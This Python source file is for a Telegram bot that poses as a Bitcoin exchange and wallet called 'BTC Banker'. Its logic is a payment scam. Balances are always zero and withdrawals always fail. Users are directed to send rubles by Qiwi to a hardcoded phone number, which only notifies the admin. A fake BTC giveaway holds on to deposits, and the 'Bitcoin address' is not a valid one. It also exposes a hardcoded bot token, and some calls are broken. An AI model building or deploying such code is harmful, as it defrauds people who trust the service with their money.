import telebot
import cherrypy
from aiogram.dispatcher import FSMContext
import time
from telebot import types
from datetime import date, datetime
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import random
import sqlite3
class Pay(StatesGroup):
    step1 = State()
    step2 = State()
    step3 = State()
    step4 = State()
connect = sqlite3.connect('db.db')
TOKEN = token = '5478258777:AAGKIi6b4yi0zoGkKCVdnVgQDQZVugahKKA'

chat_message = '5511912305'
bot = Bot(token=TOKEN)
dp = Dispatcher(bot,storage=MemoryStorage())

admin_id =5511912305

btc_address = '943f8e025473a9109315dba5dd4c65ba'
qiwi_adress = '+79833652172'
btc = 651334
num_summa = 0
num_start = 0


def isfloat(value):
    try:
        float(value)
        return True
    except ValueError:
        return False




@dp.message_handler(commands=["start"], state='*')
async def start(message, state: FSMContext):
    await state.finish()
    c = connect.cursor()
    c.execute(f'SELECT id FROM chat')
    result = c.fetchall()
    connect.commit()
    l=0
    for i in result:
        if int(i[0]) == message.chat.id:
            l=1
            break
    if l==0:
        c = connect.cursor()
        c.execute('INSERT OR IGNORE INTO chat (id) VALUES (?)', (message.from_user.id,))
        connect.commit()

    global num_start
    num_start += 1
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
    await bot.send_message(message.chat.id, '✌️ Приветствуем Вас, ' + '<b>' + message.chat.first_name + '</b>' + '!\n\n'
                                      '<b>BTC Banker</b> - это моментальный обмен <b>Bitcoin на Qiwi, Сбербанк, '
                                      'Яндекс.Деньги и Webmoney</b>\n\n'
                                      '❕ А так же бесплатное хранилище Ваших <b>BTC</b>\n\n', reply_markup=keyboard, parse_mode="Html")

@dp.message_handler(state=Pay.step2)
async def summa(message, state: FSMContext):
    summ = message.text
    await state.finish()
    if summ.isdigit():
        if int(summ) < 750:
            await bot.send_message(message.chat.id, '❌ Сумма в рублях <b>не должна быть меньше</b> 750 рублей', parse_mode="Html")
            await Pay.step2.set()
        elif int(summ) > 15000:
            await bot.send_message(message.chat.id, '❌ Сумма в рублях <b>не должна быть больше</b> 15000 рублей', parse_mode="Html")
            await Pay.step2.set()
        else:
            money = float(message.text)/btc
            money = float("%.6f" % money)
            await bot.send_message(message.chat.id, '✅ ' + str(message.text) + ' RUB' + ' = ' + str(money) + ' BTC\n\n'
                                              'Чтобы получить ' + '<b>' + str(money) + ' BTC</b>' + ' Вам необходимо совершить QIWI перевод на сумму ' + '<b>' + str(message.text) + ' rub</b> '
                                              'на никнейм, который указан ниже\n\n'
                                              '<b>❗️ Комментарий обязательно</b>', parse_mode="Html")
            time.sleep(1)
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            keyboard.add(*[types.KeyboardButton(name) for name in ['✅ Оплатил', '❌ Отказаться']])
            await bot.send_message(message.chat.id, qiwi_adress + '\n'
                                              '<b>Комментарий:</b> ' + str(random.randrange(1, 99999)) + '\n\n', reply_markup=keyboard, parse_mode="Html")
        return
    if isfloat(message.text):
        if (float(message.text)*btc) < 750:
            money = 750/btc
            money = float("%.6f" % money)
            sent = await bot.send_message(message.chat.id, '❌ Сумма в BTC <b>не должна быть меньше</b> ' + str(money) + ' BTC', parse_mode="Html")
            await bot.register_next_step_handler(sent, summa)
        elif (float(message.text)*btc) > 15000:
            money = 15000/btc
            money = float("%.6f" % money)
            sent = await bot.send_message(message.chat.id, '❌ Сумма в BTC <b>не должна быть больше</b> ' + str(money) + ' BTC', parse_mode="Html")
            await bot.register_next_step_handler(sent, summa)
        else:
            money = float(message.text)*btc
            await bot.send_message(message.chat.id, '✅ ' + str(message.text) + ' BTC' + ' = ' + str(round(money)) + ' RUB\n\n'
                                              'Чтобы получить ' + '<b>' + str(message.text) + ' BTC</b>' + ' Вам необходимо совершить QIWI перевод на сумму ' + '<b>' + str(round(money)) + ' rub</b> '
                                              'на никнейм, который указан ниже\n\n'
                                              '<b>❗️ Комментарий обязательно</b>', parse_mode="Html")
            time.sleep(1)
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            keyboard.add(*[types.KeyboardButton(name) for name in ['✅ Оплатил', '❌ Отказаться']])
            await bot.send_message(message.chat.id, qiwi_adress + '\n'
                                              '<b>Комментарий:</b> ' + str(random.randrange(1, 99999)) + '\n\n', reply_markup=keyboard, parse_mode="Html")
        return
    elif message.text == '💼 Кошелек':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📉 Вывести BTC', '📈 Внести BTC']])
        await bot.send_message(message.chat.id, '<b>💼 Bitcoin-кошелек</b>\n\n'
                                          '<b>Баланс:</b> 0.00 BTC\n'
                                          '<b>Примерно:</b> 0 руб\n\n'
                                          '<b>Всего вывели:</b> 0.00 BTC (0 руб)\n'
                                          '<b>Всего пополнили:</b> 0.00 BTC (0 руб)\n', reply_markup=keyboard, parse_mode="Html")
        return
    elif message.text == '📊 Обмен BTC':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить', '📉 Продать']])
        await bot.send_message(message.chat.id, '📊 <b>Купить/Продать Bitcoin</b>\n\n'
                                          'Бот работает полностью в <b>атоматическом режиме</b>. Средства поступают моментально\n', reply_markup=keyboard, parse_mode="Html")
        return
    elif message.text == '🚀 О сервисе':
        await bot.send_message(message.chat.id, '🚀 <b>О сервисе</b>\n\n'
                                          'Сервис для обмена Bitcoin.\n'
                                          'Пополняй внутренний кошелек с помощью Qiwi или внешнего Bitcoin-кошелька\n\n'
                                          'Продавай эти BTC для вывода на Сбербанк, Яндекс.Деньги, Webmoney и Qiwi. Или выводи на свой внешний Bitcoin-адрес\n\n'
                                          'У нас установлено ограничение минимального <b>(500 рублей)</b> и максмального <b>(15000 рублей)</b> единовременного платежа\n\n', parse_mode="Html")
        return
    elif message.text == '📌 Акция':
        await bot.send_message(message.chat.id, '📌 <b>Акция</b>\n\n'
                                          '<b>❗️Мы разыгрываем 0.25 BTC❗️</b>\n\n'
                                          'Для участия в конкурсе надо лишь воспользоваться нашим сервисом в период с <b>01.06.2020 по 01.07.2020</b> и иметь остаток на балансе не менее <b> 0.001 BTC</b>\n\n'
                                          'Этот остаток принадлежит Вам (не является платой за участие), после конкурса, даже в случае победы, никакая комиссия взиматься не будет\n\n'
                                          'Также <b>ОБЯЗАТЕЛЬНО укажите свой @username</b>, если он у Вас еще не указан\n\n'
                                          'Опредление победителя будет проходить в прямой трансляции на площадке <b>YouTube 1 июля 2020 года в 20:00 по Московскому времени</b>\n\n'
                                          '<b>Победитель получит 0.25 BTC на свой внутренний кошелек без каких либо коммиссий!</b>\n\n'
                                          'За 3 часа до начала Вам придет оповещение с ссылкой на трансляцию\n\n', parse_mode="Html")
        return
    elif message.text == '/start':
        return
    else: 
        sent = await bot.send_message(message.chat.id, '❌ <b>Некорректный ввод</b>\nПопробуйте еще раз', parse_mode="Html")




@dp.message_handler(text="💼 Кошелек", state='*')
async def key(message, state: FSMContext):
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📉 Вывести BTC', '📈 Внести BTC']])
        await bot.send_message(message.chat.id, '<b>💼 Bitcoin-кошелек</b>\n\n'
                                          '<b>Баланс:</b> 0.00 BTC\n'
                                          '<b>Примерно:</b> 0 руб\n\n'
                                          '<b>Всего вывели:</b> 0.00 BTC (0 руб)\n'
                                          '<b>Всего пополнили:</b> 0.00 BTC (0 руб)\n', reply_markup=keyboard, parse_mode="Html")
@dp.message_handler(text="📊 Обмен BTC", state='*')
async def key2(message, state: FSMContext):
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить', '📉 Продать']])
        await bot.send_message(message.chat.id, '📊 <b>Купить/Продать Bitcoin</b>\n\n'
                                          'Бот работает полностью в <b>атоматическом режиме</b>. Средства поступают моментально\n', reply_markup=keyboard, parse_mode="Html")
@dp.message_handler(text="🚀 О сервисе", state='*')
async def key3(message, state: FSMContext):
        await bot.send_message(message.chat.id, '🚀 <b>О сервисе</b>\n\n'
                                          'Сервис для обмена Bitcoin.\n'
                                          'Пополняй внутренний кошелек с помощью Qiwi или внешнего Bitcoin-кошелька\n\n'
                                          'Продавай эти BTC для вывода на Сбербанк, Яндекс.Деньги, Webmoney и Qiwi. Или выводи на свой внешний Bitcoin-адрес\n\n'
                                          'У нас установлено ограничение минимального <b>(500 рублей)</b> и максмального <b>(15000 рублей)</b> единовременного платежа\n\n', parse_mode="Html")
@dp.message_handler(text="📌 Акция", state='*')
async def key4(message, state: FSMContext):
        await bot.send_message(message.chat.id, '📌 <b>Акция</b>\n\n'
                                          '<b>❗️Мы разыгрываем 0.25 BTC❗️</b>\n\n'
                                          'Для участия в конкурсе необходимо лишь воспользоваться нашим сервисом в период с <b>01.06.2020 по 01.07.2020</b> и иметь остаток на балансе не менее <b>0.001 BTC</b>\n\n'
                                          'Этот остаток принадлежит Вам (не является платой за участие). После конкурса, даже в случае победы, никакая комиссия взиматься не будет\n\n'
                                          'Так же <b>ОБЯЗАТЕЛЬНО укажите свой @username</b>, если он у Вас еще не указан\n\n'
                                          'Опредление победителя будет проходить в прямой трансляции на площадке <b>YouTube 1 июля 2020 года в 20:00 по Московскому времени</b>\n\n'
                                          '<b>Победитель получит 0.25 BTC на свой внутренний кошелек без каких либо коммиссий!</b>\n\n'
                                          'За 3 часа до начала Вам придет оповещение с ссылкой на трансляцию\n\n', parse_mode="Html")
@dp.message_handler(text="✅ Оплатил", state='*')
async def key5(message, state: FSMContext):
        global num_summa
        num_summa += 1
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
        await bot.send_message(message.chat.id, '✅ Отлично\n'
                                          'В ближайшее время Ваши BTC будут доступны для вывода', reply_markup=keyboard, parse_mode="Html")
        print('Username - ', message.chat.username, ' ', datetime.now(), '\n', '[', message.chat.first_name, ' ', message.chat.last_name, ' ', message.chat.id, ']\n')
        await bot.send_message(admin_id, message.chat.username)
@dp.message_handler(text="❌ Отказаться", state='*')
async def key6(message, state: FSMContext):
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
        await bot.send_message(message.chat.id, '⚠️ Вы можете приобрести BTC в любое другое время!\n', reply_markup=keyboard, parse_mode="Html")
@dp.message_handler(text="How many", state='*')
async def key7(message, state: FSMContext):
        await bot.send_message(message.chat.id, 'Всего запустили бот: ' + str(num_start) + '\n'
                                          '✅ Оплатил: ' + str(num_summa))
@dp.message_handler(text="Курс111", state='*')
async def key8(message, state: FSMContext):
    if(message.chat.id == admin_id):
        await bot.send_message(message.chat.id, 'Введите курс btc')
        await Pay.step1.set()

@dp.message_handler(text="Рассылка", state='*')
async def key8(message, state: FSMContext):
    if(message.chat.id == admin_id):
        await bot.send_message(message.chat.id, 'Пришлите фото для рассылки с подписью')
        await Pay.step3.set()


@dp.message_handler(content_types=['photo'],state=Pay.step3)
async def ijewqi(message: types.Message, state: FSMContext):
    photo = message.photo[1].file_id
    text = message.caption
    c = connect.cursor()
    c.execute(f'SELECT id FROM chat')
    result = c.fetchall()
    connect.commit()
    l = 0
    for i in result:
        try:
            await bot.send_photo(int(i[0]) , photo=photo, caption=text)
        except:
            print(f"{i[0]} - отписался")
    await state.finish()

@dp.message_handler(state=Pay.step1)
async def ijewqi(message: types.Message, state: FSMContext):
    global btc
    btc = int(message.text)
    await message.answer('Новый курс установлен')
    await state.finish()

@dp.callback_query_handler(lambda callback_query: True)
async def inline(x: types.CallbackQuery):
    if x.data == '📈 Купить':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📥 Qiwi', '📥 Bitcoin']])
        await bot.send_message(x.message.chat.id, '📈 <b>Купить</b>\n\n'
                                            'Покупка BTC производится с помощью <b>Qiwi</b> или переводом на многоразовый <b>Bitcoin-адрес</b> с внешнего кошелька\n\n'
                                            'Выберите способ пополнения\n\n', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📉 Продать':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['Qiwi', 'Сбербанк', 'Webmoney', 'Яндекс.Деньги']])
        await bot.send_message(x.message.chat.id, '📉 <b>Продать</b>\n\n'
                                            'Продажа BTC осуществляется путём списания с Вашего <b>внутреннего Bitcoin-кошелька</b> и последующей отправкой рублей на выбранную Вами площадку\n'
                                            'Куда Вы хотите вывести <b>BTC</b>?', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📉 Вывести BTC':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить']])
        await bot.send_message(x.message.chat.id, '📉 <b>Вывести BTC</b>\n\n⚠️<b>У вас недостаточно BTC</b>\n'
                                            'Мин. сумма вывода: 0.0008 BTC', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📈 Внести BTC':
        await bot.send_message(x.message.chat.id, '📈 <b>Внести BTC</b>\n\nЧтобы пополнить <b>Bitcoin-кошелек</b>, Вам надо перевести Ваши BTC на многоразовый адрес который будет указан ниже\n\n'
                                            'После перевода и подтверждения 1 транзакции, Ваши BTC будут отображаться у Вас в кошельке\n'
                                            'И вы их сможете вывести на любую другую платформу, или перевести на внешний Bitcoin-адрес', parse_mode="Html")
        time.sleep(1)
        await bot.send_message(x.message.chat.id, '<b>' + str(btc_address) + '</b>', parse_mode="Html")
    elif x.data == 'Qiwi' or x.data == 'Сбербанк' or x.data == 'Яндекс.Деньги' or x.data == 'Webmoney':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить']])
        await bot.send_message(x.message.chat.id, '⚠️ <b>У вас недостаточно BTC</b>\n'
                                            'Мин. сумма вывода: 0.0008 BTC', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📥 Qiwi':
        await bot.send_message(x.message.chat.id,
                                '📥 <b>Qiwi</b>\n\nВведите сумму в <b>BTC</b> которую хотите получить или в <b>рублях</b> которые хотите перевести\n\nНапример: <b>0.002 или 500</b>\n\n'
                                '<b>❗️ BTC вводить только через точку</b>\n\nКурс обмена:\n<code>1 BTC = ' + str(
                                    btc) + ' RUB</code>', parse_mode="Html")
        await Pay.step2.set()

    elif x.data == '📥 Bitcoin':
        await bot.send_message(x.message.chat.id, '📥 <b>Bitcoin</b>\n\nЧтобы пополнить <b>Bitcoin-кошелек</b>, Вам надо перевести Ваши BTC на многоразовый адрес который будет указан ниже\n\n'
                                            'После перевода и подтверждения 1 транзакции, Ваши BTC будут отображаться у Вас в кошельке\n'
                                            'И вы их сможете вывести на любую другую платформу, или перевести на внешний Bitcoin-адрес', parse_mode="Html")
        time.sleep(0.3)
        await bot.send_message(x.message.chat.id, '<b>' + str(btc_address) + '</b>', parse_mode="Html")

if __name__ == '__main__':
    executor.start_polling(dp)